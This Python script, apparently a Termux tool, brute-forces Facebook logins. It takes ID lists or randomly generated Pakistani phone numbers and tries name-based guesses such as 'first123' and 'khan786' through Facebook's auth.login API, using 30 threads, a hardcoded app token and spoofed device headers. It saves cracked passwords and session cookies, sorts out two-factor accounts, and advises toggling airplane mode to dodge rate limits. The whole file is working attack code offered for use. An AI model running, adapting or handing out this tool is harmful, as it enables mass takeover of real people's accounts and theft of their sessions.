"""
    @ open source by ---( Younis john )---
    @ Github : https://github.com/younis-dgk
    @ facebook : https://www.facebook.com/YounisDgk
    
"""
import os
import sys
import requests
import json
import random
import uuid
import subprocess
import string
import time
import re
import platform
from concurrent.futures import ThreadPoolExecutor as YounisXyz

# Function to install missing modules
def install_missing_modules():
    print('\nInstalling missing modules...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python Xyz.py')

# Check for missing modules and install them if necessary
try:
    import datetime
    import base64
except ModuleNotFoundError:
    install_missing_modules()
except Exception as e:
    print(f'An error occurred: {e}')


# Function to get device properties
def get_device_property(prop):
    try:
        return subprocess.check_output(f'getprop {prop}', shell=True).decode('utf-8').strip()
    except Exception:
        return 'Unknown'

# Gather all required properties
android_version = get_device_property('ro.build.version.release')
model = get_device_property('ro.product.model')
build = get_device_property('ro.build.id')
fblc = 'en_GB'
fbmf = get_device_property('ro.product.manufacturer')
fbbd = get_device_property('ro.product.brand')
fbca = get_device_property('ro.product.cpu.abilist').replace(',', ':')
density_height = get_device_property('ro.hwui.text_large_cache_height')
density_width = get_device_property('ro.hwui.text_large_cache_width')
fbdm = f'density=2.25,height={density_height},width={density_width}'

# Handle SIM operator selection
sim_id = ''
try:
    fbcr_list = get_device_property('gsm.operator.alpha').split(',')
    selected_index = '1'  # Change this to '2' for the second operator
    if fbcr_list:
        if selected_index == '1':
            sim_id = fbcr_list[0].strip() if len(fbcr_list) > 0 else 'Zong'
        elif selected_index == '2':
            sim_id = fbcr_list[1].strip() if len(fbcr_list) > 1 else 'Zong'
    else:
        sim_id = 'Zong'
except Exception:
    sim_id = 'Zong'

# Create device dictionary
device = {
    'android_version': android_version,
    'model': model,
    'build': build,
    'fblc': fblc,
    'fbmf': fbmf,
    'fbbd': fbbd,
    'fbdv': model,
    'fbsv': android_version,
    'fbca': fbca,
    'fbdm': fbdm,
    'sim_id': sim_id
}

# Function to request storage permissions in Termux
def request_storage_permission():
    try:
        open('/sdcard/@YounisXyz', 'w').write(' ')
    except Exception as e:
        print(e)
        print('\033[1;93m Allow Termux Permissions! And Run Again ')
        os.system('termux-setup-storage')


directories = [
    '/sdcard/XYZ']

# Create each directory in the list
for folder_path in directories:
    try:
        os.makedirs(folder_path, exist_ok=True)
    except Exception as e:
        print(f"An error occurred while creating {folder_path}: {e}")


##-------------(Basic colors)-------------------
yellow = "\033[1;33m"
black = "\033[1;90m"
red = "\033[1;91m"
green = "\033[1;32m"
blue = "\033[1;34m"
purple = "\033[1;35m"
cyan = "\033[1;36m"
r_cyan = "\033[38;5;122m"
r_purple = "\033[38;5;147m"
r_green = "\033[38;5;112m"
white = "\033[0;97m"
reset = '\x1b[0m'
pink = "\x1b[38;5;205m"
brown = "\x1b[38;5;208m"        
colors = ["\033[1;33m", "\033[1;35m", "\033[1;31m","\033[1;32m","\x1b[38;5;208m","\x1b[38;5;205m","\033[1;94m","\033[1;96m"]       

sys.stdout.write('\x1b]2; ⏤͟͟͞͞ ⍣⃝😈🆈🄾🆄🄽🅸🅂⍣⃝😈 ͟͞⏤ \x07')
os.system('xdg-open https://www.youtube.com/@YounisXyz')
time.sleep(8)
os.system('xdg-open https://chat.whatsapp.com/CSfWIqJDSbJKdwLaQLXDFh')
# -------------(MAIN LOGO)--------------
def Banner():
    os.system('clear' if 'Linux' in sys.platform.capitalize() else 'cls')
    return f'''{white}  [version "#2.0"]{reset}
    
     Y88b   d88P Y88b   d88P 8888888888P 
      Y88b d88P   Y88b d88P        d88P  
       Y88o88P     Y88o88P        d88P   
        {cyan}Y888P       Y888P        d88P
        d888b        888        d88P{reset}
       d88888b       888       d88P      
      d88P Y88b      888      d88P       
     d88P   Y88b     888     d8888888888

{white}{45 * '-'}
Authorized by : Muhammad Younis
WhatsApp      : +923194999455
About         : https://bio.link/younis_dgk
{45 * '-'}'''
#Function to print a separator line
def line():
    print(f"{white}---------------------------------------------")


# Initialize a loop counter
loop = 0

# Lists to store different categories of data
oks = []   # For successful outcomes or valid IDs
cps = []   # For failed attempts or invalid IDs
tfa = []   # For a specific category of data (define purpose as needed)
id_list = []  # List to hold user IDs or unique identifiers


def XYZ():
	print(Banner())
	print(f"[1] File Cloning ") 
	print(f"[2] Number Cloning")
	line()
	option = input(f' Select: ')
	if option in ['1','01']:
		main()
	if option in ['2','02']:
		pakistan()
	else:
		XYZ()

def read_file(file_path):
    try:
        with open(file_path, 'r') as file:
            return file.read().splitlines()
    except FileNotFoundError:
        print(f'{red}File location not found... ')
        time.sleep(1)
        return None


def get_password_list():
    plist = []
    line()
    print(f'{white}[1] Auto Password\n[2] Choice Password')
    line()
    choice = input('Select : ')
    
    if choice in ['1', '01']:
        
        plist.extend([
            'first last', 'firstlast', 'first123', 'first1234','first12345',
            'First Last', 'first786', 'firstlast123', 'firstlast786'
        ])
    else:
        try:
            ps_limit = int(input(f'{white}How many passwords do you want to add? : '))
        except ValueError:
            ps_limit = 1  # Default to 1 if invalid input
        line()
        print(f'{r_cyan}Example: first last,firtslast,first123,first1234')
        line()
        for i in range(ps_limit):
            plist.append(input(f'{white}Put password {i + 1}:{green} '))
    return plist


def main():
    try:
        print(Banner())
        print(f'{r_cyan}Put file example: /sdcard/File.txt')
        print(f'{white}Make sure file is in your storage')
        line()
        file_path = input(f'{white}Put file path :{green} ')
        users = read_file(file_path) 
        if users is None:
            return 
        plist = get_password_list()
        with YounisXyz(max_workers=30) as crack_submit:
            print(Banner())
            total_ids = len(users)
            start_time = datetime.datetime.now()
            print(f'{white}Total Ids : {total_ids}')
            print(f'{white}Cloning Is Started. Wait for results.')
            print(f'After Every 5 Min, Turn Airplane Mode On/Off.')
            line()
            for user in users:
                ids, names = user.split('|')
                passlist = plist
                crack_submit.submit(api,ids,names,passlist,total_ids,start_time)
        line()
        print(f'{green}Process has been completed')
        print(f'{white}Total {green}OK{white}:{green} {len(oks)}')
        line()
        exit()        
    except ValueError:
        print("Invalid input, exiting...")
        exit()
    except requests.exceptions.ConnectionError:
        print('\nNo internet connection...')
        exit()


def pakistan():
		user=[]
		os.system("rm -rf ...txt") 
		passlist = []
		print(Banner())
		print('Code Example: 0300, 0301, 0311, 0315, 0330, 0332, 0340, 0344')
		code = input('Choose Code : ')
		try:
			limit = int(input('Example: 2000, 3000, 5000, 10000\nPut limit : '))
		except ValueError:
			limit = 5000
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			xyzyounis = code+nmp.replace(" ","")
			xyz = f"{code+nmp}|{nmp} {xyzyounis}\n"
			jordan = open('...txt','a').write(xyz)
		id = open('...txt').read().splitlines()
		print(f'\n{r_cyan}For auto password list type auto or Auto')
		pl = input(f'{white}How many passwords do you want to add? : ')
		if pl in ['auto','Auto','AUTO','auto or Auto']:
			passlist.append('first')
			passlist.append('last')
			passlist.append('khankhan')
			passlist.append('khan12')
			passlist.append('khan123')
			passlist.append('khan1234')
			passlist.append('khan1122')
			passlist.append('khan786')
		else:
			print(f"{r_cyan}\nFor Example : first, last, khankhan, khan123, khan1122, khan786, khan12, jan jan, i love you") 
			for cd in range(int(pl)):
				passlist.append(input(f'{white}Put password {cd+1}:{green} '))
		with YounisXyz(max_workers=30) as formSubmit:	
			print(Banner())
			total_ids = str(len(id))
			start_time = datetime.datetime.now()
			print('Total ids : \033[1;32m'+total_ids+f' ')
			print(f'\033[0;97mChoice code :\033[1;32m '+code)
			print(f'{white}Cloning Is Started. Wait for results.')
			print(f'After Every 5 Min, Turn Airplane Mode On/Off.')
			line()
			for user in id:
				ids,names = user.split('|')
				formSubmit.submit(api,ids,names,passlist,total_ids,start_time)
		line()
		print(f'{green}Process has been completed')
		print(f'{white}Total {green}OK{white}:{green} {len(oks)}')
		line()
		exit()
 

                
def api(ids,names,passlist,total_ids,start_time):
        try:
                global oks,loop,sim_id
                younisxd = str(datetime.datetime.now()-start_time).split('.')[0]
                x=random.choice(colors)
                sys.stdout.write(f"\r{x}[YounisXyz] {younisxd} {loop}/{total_ids}{reset}{green} OK:{len(oks)} {white}[{'{:.1%}'.format(loop/float(total_ids))}]");sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower());accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32';fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}';fbbv = str(random.randint(111111111,999999999));android_version = device['android_version'];model = device['model'];build = device['build'];fblc = device['fblc'];fbcr = sim_id;fbmf = device['fbmf'];fbbd = device['fbbd'];fbdv = device['fbdv'];fbsv = device['fbsv'];fbca = device['fbca'];fbdm = device['fbdm'];fbfw = '1';fbrv = '0';fban = 'FB4A';fbpn = 'com.facebook.katana';ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]';random_seed = random.Random();adid = str(''.join(random_seed.choices(string.hexdigits, k=16)));device_id = str(uuid.uuid4());secure = str(uuid.uuid4());family = str(uuid.uuid4());accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32';xd =str(''.join(random_seed.choices(string.digits, k=20)));sim_serials = f'["{xd}"]';li = ['28','29','210'];li2 = random.choice(li);j1 = ''.join(random.choice(string.digits) for _ in range(2));jazoest = li2+j1;data = {'adid':adid,'format':'json','device_id':device_id,'email':ids,'password':pas,"session_id": str(uuid.uuid4()),"advertiser_id": str(uuid.uuid4()),"reg_instance": str(uuid.uuid4()),"logged_out_id": str(uuid.uuid4()),"hash_id": str(uuid.uuid4()),"sim_country": "id","network_country": "id","enroll_misauth": "false",'generate_analytics_claims':'1','credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false',"cpl": "true",'generate_session_cookies':'1','generate_machine_id':'1','meta_inf_fbmeta':'','currently_logged_in_userid':'0','fb_api_req_friendly_name':'authenticate',"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",};headers={'Authorization':f'OAuth {accessToken}',"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),"X-FB-Net-HNI": str(random.randint(900000, 999999)),"X-FB-SIM-HNI": str(random.randint(20000, 40000)),'X-FB-Friendly-Name':'authenticate','X-FB-Connection-Type':'unknown','User-Agent':ua,'Accept-Encoding':'gzip, deflate','Content-Type': 'application/x-www-form-urlencoded','X-FB-HTTP-Engine': 'Liger'};url = 'https://b-api.facebook.com/method/auth.login';twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in';po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\033[1;92m[Successful-XYZ] '+ids+'|'+pas+'')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r{r_green} {coki}") 
                                        open(f'/sdcard/xyz_ok.txt','a', encoding='utf-8').write(f'[XYZ-OK] {ids} | {pas}\n')
                                        open(f'/sdcard/xyz_ok_with_cookies.txt','a', encoding='utf-8').write(f'[XYZ-OK] {ids} | {pas} {coki}\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        print(f'\r\033[9;91m[Two-Fector-XYZ] {ids}|{pas}\033[0m')
                                        open(f'/sdcard/xyz_2f.txt','a', encoding='utf-8').write(f'[XYZ-2F] {ids} | {pas}\n')
                                        tfa.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error_msg']:
                                        print(f'\r{yellow}[CheckPoint-XYZ] {ids}|{pas}')
                                        open(f'/sdcard/xyz_cp.txt','a', encoding='utf-8').write(f'[XYZ-CP] {ids} | {pas}\n')
                                        break
                                        cps.append(ids)
                        else:
                        	continue
                loop+=1
        except Exception as e:
                pass
                
               
XYZ()